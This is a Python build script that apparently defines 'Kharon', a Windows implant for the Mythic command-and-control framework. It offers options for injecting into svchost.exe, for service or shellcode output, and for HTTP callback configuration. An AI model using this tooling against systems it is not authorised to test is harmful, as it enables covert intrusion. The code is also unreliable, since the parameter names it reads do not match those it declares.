import logging, json
import traceback
import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from distutils.dir_util import copy_tree
import asyncio, os, tempfile, base64

class KharonAgent( PayloadType ):
    name             = "Kharon";
    file_extension   = "bin";
    author           = "@ Oblivion";
    supported_os     = [SupportedOS.Windows];
    wrapper          = False;
    wrapped_payloads = [];
    note             = """Kharon agent. Version: v0.0.1"""
    supports_dynamic_loading = True;
    c2_profiles      = ["http"];
    # mythic_encrypts  = True
    translation_container = "KharonTranslator";
    build_parameters = [
        BuildParameter(
            name           = "Spawnto",
            parameter_type = BuildParameterType.String,
            default_value  = "C:\\Windows\\System32\\svchost.exe",
            description    ="used to fork and run routines",
        ),
        BuildParameter(
            name            = "Output",
            parameter_type  = BuildParameterType.ChooseOne,
            choices         = [ "exe", "dll", "svc", "bin"],
            default_value   = "bin",
            description     = "executable (.exe), dynamic linked library (.dll), service executable (.svc.exe) and shellcode (.bin)",
        ),
        BuildParameter(
            name            = "Debug",
            parameter_type  = BuildParameterType.Boolean,
            default_value   = "false",
            description     = "generate an agent with debug strings. The debug output is handled using DbgPrint and can be viewed in a debugger",
        )
    ]

    AgentPath = pathlib.Path(".") / "Mythic";
    # AgentIconPath = AgentPath / "agent_functions" / "xenon_agent.svg"
    AgentIconPath = AgentPath / "agent_functions" / "v1-transparent.png";
    AgentCodePath = pathlib.Path(".") / "Agent";
    
    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Configuring", step_description="Stamping in configuration values"),
        BuildStep(step_name="Installing Modules", step_description="Compile and include necessary BOFs"),
        BuildStep(step_name="Compiling", step_description="Compiling with Mingw-w64")

    ]

    # Build the actual agent payload
    async def build(self) -> BuildResponse:

        logging.basicConfig( level=logging.INFO );
        
        resp = BuildResponse( status=BuildStatus.Success );
        
        Config = {
            "payload_uuid": self.uuid,
            "callback_host": "",
            "User-Agent": "",
            "httpMethod": "POST",
            "post_uri": "",
            "headers": [],
            "callback_port": 80,
            "ssl":False,
            "proxyEnabled": False,
            "proxy_host": "",
            "proxy_user": "",
            "proxy_pass": "",
        }

        stdout_err = "";

        for c2 in self.c2info:
            profile = c2.get_c2profile()
            for key, val in c2.get_parameters_dict().items():
                print( key, val )
                if isinstance(val, dict) and 'enc_key' in val:
                    stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
                    encKey = base64.b64decode(val["enc_key"]) if val["enc_key"] is not None else ""
                elif key == "headers":
                    Config["User-Agent"]= val["User-Agent"];
                else:
                    Config[key] = val
            break

        if "https://" in Config["callback_host"]:
            Config["ssl"] = True;

        Config["callback_host"] = Config["callback_host"].replace("https://", "").replace("http://","");
        
        if Config["proxy_host"] != "":
            Config["proxyEnabled"] = True;
        
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName    = "Gathering Files",
                StepStdout  = "Found all files for payload",
                StepSuccess = True
        ));

        AgentPath = tempfile.TemporaryDirectory( suffix=self.uuid )
        copy_tree( str( self.agent_code_path ), AgentPath.name )
        
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName    = "Applying configuration",
                StepStdout  = "All configuration setting applied",
                StepSuccess = True
        ));
        
        # with open( AgentPath.name + "/Include/Config.h", "r+" ) as f:
        #     content = f.read();

        #     print( f"\n\ncontent: \n{content}" );
        #     content = content.replace( "%UUID%",     Config["payload_uuid"] );
        #     content = content.replace( "%HOSTNAME%", Config["callback_host"] );
        #     content = content.replace( "%ENDPOINT%", Config["post_uri"] );

        #     if Config["ssl"]:
        #         content = content.replace( "%SSL%", "TRUE" );
        #     else:
        #         content = content.replace( "%SSL%", "FALSE" );
            
        #     if Config["proxyEnabled"]:
        #         content = content.replace( "%PROXYENABLED%", "TRUE" );
        #     else:
        #         content = content.replace( "%PROXYENABLED%", "FALSE" );
        #     f.seek( 0 );
        #     f.write( content );
        #     f.truncate();
        
        #     print( f"\n\ncontent: \n{content}" );

        Arch    = self.get_parameter( "Architecture" );
        Format  = self.get_parameter( "Format" );
        Debug   = self.get_parameter( "Debug Mode" );

        ComnmandBuild2 = f"cmake --build {AgentPath.name}/Build";
        CommandBuild   = f"cmake -S {AgentPath.name} -B {AgentPath.name}/Build -D BUILD_PATH={AgentPath.name} -D ARCH={Arch} -D DBGMODE={Debug}; {ComnmandBuild2}";
        print( f"\n\ncommand for build: \n{CommandBuild}" )
        FileName      = ( AgentPath.name + f"/Bin/Stage37.{Arch}.exe" );

        proc           = await asyncio.create_subprocess_shell( CommandBuild, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE );
        stdout, stderr = await proc.communicate();
        print( f"\n\nstdout: \n{stdout.decode("cp850")}" );
        print( f"\n\nstrerr: \n{stderr.decode("cp850")}" );
        
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName    = "Compile",
                StepStdout  = "Successfuly compiled Kharon Agent",
                StepSuccess = True
        ));

        build_msg    = "";
        resp.payload = open( FileName, "rb" ).read();
        resp.build_stderr = stderr;
        resp.build_stdout = stdout;

        return resp;
